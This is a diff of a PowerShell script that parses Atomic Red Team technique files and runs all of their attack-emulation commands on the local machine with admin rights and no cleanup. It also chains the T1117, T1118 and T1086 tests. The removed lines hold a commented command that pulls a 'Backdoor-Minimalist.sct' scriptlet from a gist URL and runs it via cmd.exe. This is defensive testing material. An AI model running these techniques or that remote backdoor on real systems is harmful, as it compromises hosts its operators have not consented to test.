@@ -3,11 +3,14 @@
 # Requirements Windows 10, and PowerShell-Yaml
 # Admin Rights
 # Caveat... We make no effort to clean up the tests artifacts. we probably should lol
+# Only run on test Systems
+
 
 <#
 TODO:
 Fix Quotations
 Verbs
+Output Objects, not Text
 
 
 #>
@@ -39,16 +42,21 @@ Write-Host $AtomicAsciiArt -Foreground Green
 
 $AtomicFilePath = 'C:\Users\subtee\downloads\atomic-red-team-master\atomics\' #Input Parameter Defined in beginning of script.
 
-function Set-AtomicVariables([string] $AtomicFilePath)
+function Set-AtomicArray([string] $AtomicFilePath)
 {
 	#All or Just One?  Modify this to accept one, some, or all tests
+	$AtomicTechniqueArray = @()
 	
 	Get-Childitem $AtomicFilePath -Recurse -Filter *.yaml -File | ForEach-Object {
 	#Get-ChildItem -Path $AtomicFilePath -Filter *.yaml -Recurse -File -Name | ForEach-Object {
 		try
 		{
 			$currentTechnique = [System.IO.Path]::GetFileNameWithoutExtension($_.FullName);
-			New-Variable -Name $currentTechnique -Value (ConvertFrom-Yaml (Get-Content $_.FullName -Raw )) -Scope "Script";
+			$parsedYaml = (ConvertFrom-Yaml (Get-Content $_.FullName -Raw ))
+			New-Variable -Name $currentTechnique -Value $parsedYaml -Scope "Script";
+			#We could also return objects here
+			#Returning Objects Allows For Pipeline BEGIN PROCESS FINISH etc..
+			$AtomicTechniqueArray += $parsedYaml
 		}
 		catch
 		{
@@ -56,91 +64,40 @@ function Set-AtomicVariables([string] $AtomicFilePath)
 		}
 		
 	}
-
+	
+	return ,$AtomicTechniqueArray
 }
 
-Set-AtomicVariables([string] $AtomicFilePath) #Sets Up variables, Adjust Method to be one, some, or all...
-
-$AtomicTechniqueVariableArray = (Get-Variable T1*)
-#$AtomicTechniqueVariableArray.Count #Debug Count Check
-
-#Extracts Technique Object
-$AllAtomicTechniques =  $AtomicTechniqueVariableArray |  %{ $_.Value } 
-
-<# Debug Counts Output
-
-$AllAtomicWindowsTechniques.Count 
-$AllAtomicWindowsTests = $AllAtomicWindowsTechniques.atomic_tests 
-$AllAtomicWindowsTests.Count
-
-#>
-
-
-<#	
-# Parse and execute a specific test.
-# T1117
-Write-Host $T1117.display_name.ToString(), $T1117.attack_technique.ToString() "has " $T1117.atomic_tests.Count "tests"  -Foreground Yellow 
-Write-Host "Executing Test 1" -Foreground Green
-$thingtoexec = $T1117.atomic_tests[1].executor.command | %{ $_.replace('#{url}', 'https://gist.githubusercontent.com/caseysmithrc/7035ee694e9f1ced26654fa825aa193a/raw/8ff906fe8053b965ba517bb84c1488744e51843e/Backdoor-Minimalist.sct')}
-#Things to replace could come from a config file etc...
-#Is replace best or... Set a "value" property explicitly
-
-& cmd.exe /c $thingtoexec 
-#>
-
-#Now Loop Over Each Test 
-
-#Takes $AtomicTechnique Parsed From YAML and Executes it with Default Values
 function ExecuteAtomicTechnique([System.Collections.Hashtable] $AtomicTechnique)
 {
+	#Takes $AtomicTechnique Parsed From YAML and Executes it with Default Values
 	#Designed to Run ALL Tests For A Technique
-	#Print Test Name, and Description, and Count of Tests
-	Write-Host '[********BEGIN TEST*******]' $AtomicTechnique.display_name.ToString(), $AtomicTechnique.attack_technique.ToString() "has" $AtomicTechnique.atomic_tests.Count "Test(s)"  -Foreground Yellow 
+	Write-Host "[********BEGIN TEST*******]`n" $AtomicTechnique.display_name.ToString(), $AtomicTechnique.attack_technique.ToString() "has" $AtomicTechnique.atomic_tests.Count "Test(s)"  -Foreground Yellow 
 	#Call ExecuteAtomicTest
 	$AtomicTechnique.atomic_tests | %{ ExecuteAtomicTest $_ }
 	Write-Host "[!!!!!!!!END TEST!!!!!!!]`n"
 	
-	
 }
 
-#PowerShellize these names and verbs.
-#Make them pipeline aware and all that
+#Refactor this to Get-AtomicTest and output execution plans
 
 function ExecuteAtomicTest([System.Collections.Hashtable] $AtomicTest)
 {
 	#Short Circuit Exit On Conditions
 	#For Now We Only care about Windows Tests
-	#if ( !($AtomicTest.supported_platforms.Contains($SupportedPlatforms)) ) 	{ return }
+	if ( !($AtomicTest.supported_platforms.Contains($SupportedPlatforms)) ){ return }
 	#Reject Manual Tests
 	if ( ($AtomicTest.executor.name.Contains('manual')) ) 	{ return }
-	
-	#Designed to Run An Individual Test  
-	#Debug Writes
+
 	Write-Host $AtomicTest.name.ToString()
 	Write-Host $AtomicTest.description.ToString()
 	
 	$finalCommand = $AtomicTest.executor.command
-	#Write-Host $AtomicTest.supported_platforms
-	#Put the Check Here for SupportedPlatforms var before execution.
-	#Write-Host $AtomicTest.executor.name
-	
-	#Convert Executor to actual command , 
-	
-	#Write-Host $AtomicTest.executor.command -Foreground Green
-	#Check for input_arguments... For each input_arguments.
-	#Find that argument and replace it in the command string.
-	
-	
-	
-	
+		
 	if($AtomicTest.input_arguments.Count -gt 0)
 	{
-		#This Can Be An Array In Some Tests
-		#This is crazy, nested HashTable VooDoo
 		$InputArgs = [Array]($AtomicTest.input_arguments.Keys).Split(" ")
 		$InputDefaults = [Array]( $AtomicTest.input_arguments.Values | %{$_.default }).Split(" ")
-		
-		 
 		
 		for($i = 0; $i -lt $InputArgs.Length; $i++)
 		{	
@@ -153,7 +110,6 @@ function ExecuteAtomicTest([System.Collections.Hashtable] $AtomicTest)
 	}
 	else
 	{
-		#Just produce command
 		Write-Host $finalCommand -Foreground Green
 		
 	}
@@ -161,8 +117,120 @@ function ExecuteAtomicTest([System.Collections.Hashtable] $AtomicTest)
 	
 }
 
+function Invoke-ChainReaction([System.Collections.Hashtable] $AtomicTechnique)
+{
 
-$AllAtomicTechniques | %{ ExecuteAtomicTechnique($_) }
+	
+	$AtomicTechnique.atomic_tests | %{ ExecuteAtomicTest $_ }
+	
+}
+
+
+$AllAtomicTechniques = Set-AtomicArray([string] $AtomicFilePath) #Sets Up variables, Adjust Method to be one, some, or all...
+$AllAtomicTechniques.Count 
+
+#Executes ALL Tests
+$AllAtomicTechniques | %{ ExecuteAtomicTechnique $_ }
+
+
+
+$AsciiChainReacion = @'
+                     - Diagram of a Chain Reaction -
+                        -------------------------------
+
+
+
+                                       |
+                                       |
+                                       |
+                                       |
+    [1]------------------------------> o
+
+                                    . o o .
+                                   . o_0_o . <-----------------------[2]
+                                   . o 0 o .
+                                    . o o .
+
+                                       |
+                                      \|/
+                                       ~
+
+                                 . o o. .o o .
+    [3]-----------------------> . o_0_o"o_0_o .
+                                . o 0 o~o 0 o .
+                                 . o o.".o o .
+                                       |
+                                  /    |    \
+                                |/_    |    _\|
+                                ~~     |     ~~
+                                       |
+                           o o         |        o o
+    [4]-----------------> o_0_o        |       o_0_o <---------------[5]
+                          o~0~o        |       o~0~o
+                           o o )       |      ( o o
+                              /        o       \
+                             /        [1]       \
+                            /                    \
+                           /                      \
+                          /                        \
+                         o [1]                  [1] o
+                 . o o .            . o o .            . o o .
+                . o_0_o .          . o_0_o .          . o_0_o .
+                . o 0 o .  <-[2]-> . o 0 o . <-[2]->  . o 0 o .
+                 . o o .            . o o .            . o o .
+
+                  /                    |                    \
+                |/_                   \|/                   _\|
+                ~~                     ~                     ~~
+
+      . o o. .o o .              . o o. .o o .              . o o. .o o .
+     . o_0_o"o_0_o .            . o_0_o"o_0_o .            . o_0_o"o_0_o .
+     . o 0 o~o 0 o . <--[3]-->  . o 0 o~o 0 o .  <--[3]--> . o 0 o~o 0 o .
+      . o o.".o o .              . o o.".o o .              . o o.".o o .
+        .   |   .                  .   |   .                  .   |   .
+       /    |    \                /    |    \                /    |    \
+       :    |    :                :    |    :                :    |    :
+       :    |    :                :    |    :                :    |    :
+      \:/   |   \:/              \:/   |   \:/              \:/   |   \:/
+       ~    |    ~                ~    |    ~                ~    |    ~
+  [4] o o   |   o o [5]      [4] o o   |   o o [5]      [4] o o   |   o o
+[5]
+     o_0_o  |  o_0_o            o_0_o  |  o_0_o            o_0_o  |  o_0_o
+     o~0~o  |  o~0~o            o~0~o  |  o~0~o            o~0~o  |  o~0~o
+      o o ) | ( o o              o o ) | ( o o              o o ) | ( o o
+         /  |  \                    /  |  \                    /  |  \
+        /   |   \                  /   |   \                  /   |   \
+       /    |    \                /    |    \                /    |    \
+      /     |     \              /     |     \              /     |     \
+     /      o      \            /      o      \            /      o      \
+    /      [1]      \          /      [1]      \          /      [1]      \
+   o                 o        o                 o        o
+o
+  [1]               [1]      [1]               [1]      [1]
+[1]
+
+============================================================================
+
+                              - Diagram Outline -
+                             ---------------------
+
+
+                        [1] - Incoming Neutron
+                        [2] - Uranium-235
+                        [3] - Uranium-236
+                        [4] - Barium Atom
+                        [5] - Krypton Atom
+
+===========================================================================
+
+'@
+
+
+
+
+$ChainReaction = @($T1117, $T1118, $T1086 )
+$ChainReaction | % { Invoke-ChainReaction $_ }
+Write-Host $AsciiChainReacion -Foreground Cyan
 
 
 
@@ -186,7 +254,4 @@ $PowerShellBoom = @'
  
 Write-Host $PowerShellBoom -Foreground Yellow
 Write-Host "Test Complete, Go Sift Through The Fallout" -Foreground Cyan
-
-
-
 
